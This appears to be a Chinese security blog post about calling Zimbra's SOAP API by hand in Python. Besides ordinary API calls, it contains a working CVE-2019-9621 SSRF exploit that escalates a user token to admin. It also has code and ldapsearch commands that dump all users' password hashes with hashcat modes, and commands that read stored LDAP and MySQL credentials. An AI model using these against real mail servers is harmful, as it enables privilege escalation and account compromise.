---
layout: post
title: Zimbra SOAP API开发指南
---


## 0x00 前言
---

通过Zimbra SOAP API能够对Zimbra邮件服务器的资源进行访问和修改，Zimbra官方开源了Python实现的[Python-Zimbra](https://github.com/Zimbra-Community/python-zimbra)库作为参考

为了更加了解Zimbra SOAP API的开发细节，我决定不依赖[Python-Zimbra](https://github.com/Zimbra-Community/python-zimbra)库，参照[API文档](https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/index.html)的数据格式尝试手动拼接数据包，实现对Zimbra SOAP API的调用

## 0x01 简介
---

本文将要介绍以下内容：

- Zimbra SOAP API简介
- Python-Zimbra简单测试
- Zimbra SOAP API框架的开发思路
- 开源代码

## 0x02 Zimbra SOAP API简介
---

Zimbra SOAP API包括以下命名空间：

- zimbraAccount
- zimbraAdmin
- zimbraAdminExt
- zimbraMail
- zimbraRepl
- zimbraSync
- zimbraVoice

每个命名空间下对应不同的操作命令，其中常用的命名空间有以下三个：

1. zimbraAdmin，Zimbra邮件服务器的管理接口，需要管理员权限
2. zimbraAccount，同Zimbra用户相关的操作
3. zimbraMail，同zimbra邮件的操作

Zimbra邮件服务器默认的开放端口有以下三种：

1.访问邮件

默认端口为80或443

对应的地址为：`uri+"/service/soap"`


2.管理面板

默认端口为7071

对应的地址为：`uri+":7071/service/admin/soap"`


3.管理面板->访问邮件

从管理面板能够读取所有用户的邮件

默认端口为8443

对应的地址为：`uri+":8443/mail?adminPreAuth=1"`


## 0x03 Python-Zimbra简单测试
---

参考地址：

https://github.com/Zimbra-Community/python-zimbra

http://zimbra-community.github.io/python-zimbra/docs/

对于自己的测试环境，需要忽略SSL证书验证，使用如下代码：

```
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
```

使用用户名和口令登录的示例代码如下：

```
token = auth.authenticate(
    url,
    'test@mydomain.com',
    'password123456',
    use_password=True
)
```

使用preauth-key登录的示例代码如下：

```
token = auth.authenticate(
    url,
    'test@mydomain.com',
    'secret-preauth-key'
)
```

### 1.普通用户登录

对应的地址为：`uri+"/service/soap"`

获得发件箱邮件数量的示例代码如下：

```
import pythonzimbra.communication
from pythonzimbra.communication import Communication
import pythonzimbra.tools
from pythonzimbra.tools import auth
import warnings
warnings.filterwarnings("ignore")
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

url  = 'https://192.168.112.1/service/soap'
comm = Communication(url)
token = auth.authenticate(
    url,
    'test',
    'password123456',
    use_password=True,
)
info_request = comm.gen_request(token=token)
info_request.add_request(
    "GetFolderRequest",
    {
        "folder": {
            "path": "/sent"
        }
    },
    "urn:zimbraMail"
)
info_response = comm.send_request(info_request)
print(info_response.get_response())
if not info_response.is_fault():
    print("size:%s"%info_response.get_response()['GetFolderResponse']['folder']['n'])
```

运行结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/2-1.png)

### 2.管理员登录

对应的地址为：`uri+":7071/service/admin/soap"`

获得所有邮件用户信息的示例代码如下：

```
import pythonzimbra.communication
from pythonzimbra.communication import Communication
import pythonzimbra.tools
from pythonzimbra.tools import auth
import warnings
warnings.filterwarnings("ignore")
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

url  = 'https://192.168.112.1:7071/service/admin/soap'
comm = Communication(url)
token = auth.authenticate(
    url,
    'admin',
    'password123456',
    use_password=True,
    admin_auth=True, 
)
info_request = comm.gen_request(token=token)
info_request.add_request(
    "GetAllAccountsRequest",
    {
        
    },
    "urn:zimbraAdmin"
)
info_response = comm.send_request(info_request)
if not info_response.is_fault():
    print(info_response.get_response()['GetAllAccountsResponse'])
```

运行结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/2-2.png)


## 0x04 Zimbra SOAP API框架的实现
---

Zimbra SOAP API的参考文档：

https://wiki.zimbra.com/wiki/SOAP_API_Reference_Material_Beginning_with_ZCS_8

https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/index.html

实现的总体思路如下：

1. 模拟用户登录，获得token
2. 使用token作为凭据，进行下一步操作

### 1.token的获取

#### (1)普通用户token

说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraAccount/Auth.html

对应命名空间为zimbraAccount

请求的地址为：`uri+"/service/soap"`

根据说明文档中的SOAP格式，可通过以下Python代码实现：

```
def auth_request_low(uri,username,password):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">              
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="urn:zimbraAccount">
            <account by="adminName">{username}</account>
            <password>{password}</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
    """
    print("[*] Try to auth for low token")
    try:
      r=requests.post(uri+"/service/soap",data=request_body.format(username=username,password=password),verify=False,timeout=15)
      if 'authentication failed' in r.text:
        print("[-] Authentication failed for %s"%(username))
        return False
      elif 'authToken' in r.text:
        pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
        token = pattern_auth_token.findall(r.text)[0]
        print("[+] Authentication success for %s"%(username))
        print("[*] authToken_low:%s"%(token))
        return token
      else:
        print("[!]")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
```

#### (2)管理员token

说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraAdmin/Auth.html

对应命名空间为zimbraAdmin

请求的地址为：`uri+":7071/service/admin/soap"`

根据说明文档中的SOAP格式，可通过以下Python代码实现：

```
def auth_request_admin(uri,username,password):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">            
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="urn:zimbraAdmin">
            <account by="adminName">{username}</account>
            <password>{password}</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
    """
    print("[*] Try to auth for admin token")
    try:
      r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(username=username,password=password),verify=False,timeout=15)
      if 'authentication failed' in r.text:
        print("[-] Authentication failed for %s"%(username))
        return False
      elif 'authToken' in r.text:
        pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
        token = pattern_auth_token.findall(r.text)[0]
        print("[+] Authentication success for %s"%(username))
        print("[*] authToken_admin:%s"%(token))
        return token
      else:
        print("[!]")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
```

#### 补充： (3)普通用户token->管理员token

漏洞编号：CVE-2019-9621

利用`ProxyServlet.doProxy()`函数白名单检查的缺陷，能够将`uri+"/service/soap"`的请求代理到`uri+":7071/service/admin/soap"`，进而获得管理员token

Python实现代码如下：

```
def lowtoken_to_admintoken_by_SSRF(uri,username,password):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="{xmlns}">
            <account by="adminName">{username}</account>
            <password>{password}</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
    """
    print("[*] Try to auth for low token")
    try:
      r=requests.post(uri+"/service/soap",data=request_body.format(xmlns="urn:zimbraAccount",username=username,password=password),verify=False)
      if 'authentication failed' in r.text:
        print("[-] Authentication failed for %s"%(username))
        return False
      elif 'authToken' in r.text:
        pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
        low_token = pattern_auth_token.findall(r.text)[0]
        print("[+] Authentication success for %s"%(username))
        print("[*] authToken_low:%s"%(low_token))
        headers = {
        "Content-Type":"application/xml"
        }
        headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+low_token+";"
        headers["Host"]="foo:7071"
        print("[*] Try to get admin token by SSRF(CVE-2019-9621)")    
        s = requests.session()
        r = s.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(xmlns="urn:zimbraAdmin",username=username,password=password),headers=headers,verify=False)
        if 'authToken' in r.text:
          admin_token =pattern_auth_token.findall(r.text)[0]
          print("[+] Success for SSRF")
          print("[+] ADMIN_TOKEN: "+admin_token)
          return admin_token
        else:
          print("[!]")
          print(r.text)
      else:
        print("[!]")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
```

### 2.命令实现

如果需要管理员token，在说明文档中每个命令的Admin Authorization token required项会被标记，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/3-1.png)

这里挑选几个具有代表性的命令进行介绍

#### (1)GetFolder

说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraMail/GetFolder.html

用来获得文件夹的属性

需要普通用户token

枚举所有文件夹下邮件数量的Python代码如下：

```
def getfolder_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetFolderRequest xmlns="urn:zimbraMail"> 
         </GetFolderRequest>
       </soap:Body>
    </soap:Envelope>
    """
    
    try:
      print("[*] Try to get folder")
      r=requests.post(uri+"/service/soap",data=request_body.format(token=token),verify=False,timeout=15)
      pattern_name = re.compile(r"name=\"(.*?)\"")
      name = pattern_name.findall(r.text)
      pattern_size = re.compile(r" n=\"(.*?)\"")
      size = pattern_size.findall(r.text)      
      for i in range(len(name)):
        print("[+] Name:%s,Size:%s"%(name[i],size[i]))
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
```

测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/4-1.png)

#### (2)GetMsg

说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraMail/GetMsg.html

用来读取邮件信息

需要普通用户token

查看指定邮件的Python代码如下：


```
def getmsg_request(uri,token,id):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetMsgRequest xmlns="urn:zimbraMail"> 
            <m>
                <id>{id}</id>
            </m>
         </GetMsgRequest>
       </soap:Body>
    </soap:Envelope>
    """
    
    try:
      print("[*] Try to get msg")
      r=requests.post(uri+"/service/soap",data=request_body.format(token=token,id=id),verify=False,timeout=15)
      print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
```

这些需要指定要查看邮件的Message ID，测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/4-2.png)

#### (3)GetContacts

说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraMail/GetContacts.html

用来读取联系人列表

需要普通用户token

Python实现代码如下：

```
def getcontacts_request(uri,token,email):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetContactsRequest xmlns="urn:zimbraMail">
            <a n="email">{email}</a>
         </GetContactsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    
    try:
      print("[*] Try to get contacts")
      r=requests.post(uri+"/service/soap",data=request_body.format(token=token,email=email),verify=False,timeout=15)
      pattern_data = re.compile(r"<soap:Body>(.*?)</soap:Body>")
      data = pattern_data.findall(r.text)
      print(data[0])
      
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
```

测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/4-3.png)

#### (4)GetAllAccounts

说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraAdmin/GetAllAccounts.html

用来获得所有用户的信息

需要管理员token

获得所有用户列表，输出用户名和对应Id的Python实现代码如下：

```
def getallaccounts_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllAccountsRequest xmlns="urn:zimbraAdmin">
         </GetAllAccountsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    
    try:
      print("[*] Try to get all accounts")
      r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
      pattern_name = re.compile(r"name=\"(.*?)\"")
      name = pattern_name.findall(r.text)
      pattern_accountId = re.compile(r"id=\"(.*?)\"")
      accountId = pattern_accountId.findall(r.text)
      
      for i in range(len(name)):
        print("[+] Name:%s,Id:%s"%(name[i],accountId[i]))

    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
```

测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/4-4.png)

#### (5)GetLDAPEntries

说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraAdmin/GetLDAPEntries.html

用来获取ldap搜索的结果

需要管理员token

实现LDAP查询的Python代码如下：

```
def getldapentries_request(uri,token,query,ldapSearchBase):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetLDAPEntriesRequest xmlns="urn:zimbraAdmin">
            <query>{query}</query>
            <ldapSearchBase>{ldapSearchBase}</ldapSearchBase>
         </GetLDAPEntriesRequest>
       </soap:Body>
    </soap:Envelope>
    """
    
    try:
      print("[*] Try to get LDAP Entries of %s"%(query))
      r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),verify=False,timeout=15)
      print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
```

这里我们需要先了解zimbra openLDAP的用法，才能明白参数`query`和`ldapSearchBase`的格式

在Zimbra服务器上测试以下命令：

1.获得连接LDAP服务器的用户名和口令：

```
su zimbra
/opt/zimbra/bin/zmlocalconfig -s |grep zimbra_ldap
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/5-0.png)

2.使用获得的用户名和口令连接LDAP服务器，输出所有结果：

```
/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/5-2.png)

3.加入筛选条件，只显示用户列表：

```
/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9 "(&(objectClass=zimbraAccount))"
```

或者

```
/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9 -b "ou=people,dc=zimbra,dc=com"
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/5-3.png)

可以注意到userPassword项为用户口令的hash

4.再次加入筛选条件，只显示用户名称和对应hash：

```
/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9 "(&(objectClass=zimbraAccount))" mail userPassword
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/5-4.png)

其中导出的hash前12字节为固定字符`e1NTSEE1MTJ9`，经过base64解密后的内容为`{SSHA512}`，后面部分为SHA-512加密的字符，对应hashcat的Hash-Mode为1700

#### 补充1：其他ldap命令

查询zimbra配置信息：

```
/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9 -b "cn=config,cn=zimbra"

/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9 -b "cn=cos,cn=zimbra"
```

查询zimbra server配置信息：

```
/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9 -b `"cn=servers,cn=zimbra"`
```

其中包括如下内容：

- zimbraSshPublicKey
- zimbraMemcachedClientServerList
- zimbraSSLCertificate
- zimbraSSLPrivateKey

#### 补充2：连接MySQL数据库的操作

1.获得连接MySQL数据库的用户名和口令：

```
su zimbra
/opt/zimbra/bin/zmlocalconfig -s | grep mysql
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/5-5.png)

2.连接MySQL数据库：

```
/opt/zimbra/bin/mysql -h 127.0.0.1 -u root -P 7306 -p
```

3.查看所有数据库：

```
show databases;
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/5-6.png)

综上，如果要查询所有用户的信息，`query`的值可以设置为`"cn=*"`，`ldapSearchBase`的值可以设置为`"ou=people,dc=zimbra,dc=com"`

**注：**

不同环境的`ldapSearchBase`值不同，通常和域名保持一致

通过LDAP查询获得用户名称和对应hash的Python代码如下：

```
def getalluserhash(uri,token,query,ldapSearchBase):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetLDAPEntriesRequest xmlns="urn:zimbraAdmin">
            <query>{query}</query>
            <ldapSearchBase>{ldapSearchBase}</ldapSearchBase>
         </GetLDAPEntriesRequest>
       </soap:Body>
    </soap:Envelope>
    """
    
    try:
      print("[*] Try to get all users' hash")
      r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),verify=False,timeout=15)
      if 'userPassword' in r.text:
        pattern_data = re.compile(r"userPass(.*?)objectClass")
        data = pattern_data.findall(r.text)   
        for i in range(len(data)):
          pattern_user = re.compile(r"mail\">(.*?)<")
          user = pattern_user.findall(data[i])
          pattern_password = re.compile(r"word\">(.*?)<")  
          password = pattern_password.findall(data[i])  
          print("[+] User:%s"%(user[0]))  
          print("    Hash:%s"%(password[0]))

      else:
        print("[!]")
        print(r.text)      

    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
```

测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/6-1.png)

其中导出的hash对应hashcat的Hash-Mode为1711

**注：**

新版本的zimbra无法读取hash，显示`VALUE-BLOCKED`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/6-2.png)

## 0x05 开源代码
---

代码已开源，地址如下：

https://github.com/3gstudent/Homework-of-Python/blob/master/Zimbra_SOAP_API_Manage.py

代码支持三种连接方式：

- 普通用户token
- 管理员token
- SSRF(CVE-2019-9621)

连接成功后会显示支持的命令

普通用户token支持的命令如下：

```
GetAllAddressLists
GetContacts
GetFolder
GetItem ,Eg:GetItem /Inbox
GetMsg ,Eg:GetMsg 259
```

部分测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/7-1.png)

管理员token支持的命令如下：

```
GetAllDomains
GetAllMailboxes
GetAllAccounts
GetAllAdminAccounts
GetMemcachedClientConfig
GetLDAPEntries ,Eg:GetLDAPEntries cn=* dc=zimbra,dc=com
getalluserhash ,Eg:getalluserhash dc=zimbra,dc=com
```

部分测试结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/7-2.png)

## 0x06 日志检测
---

登录日志的位置为`/opt/zimbra/log/mailbox.log`

其他种类的邮件日志可参考https://wiki.zimbra.com/wiki/Log_Files

## 0x07 小结
---

本文简单测试了[Python-Zimbra](https://github.com/Zimbra-Community/python-zimbra)库，参照[API文档](https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/index.html)的数据格式手动拼接数据包，实现对Zimbra SOAP API的调用，开源代码[Zimbra_SOAP_API_Manage](https://github.com/3gstudent/Homework-of-Python/blob/master/Zimbra_SOAP_API_Manage.py)，分享脚本开发的细节，便于后续的二次开发



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

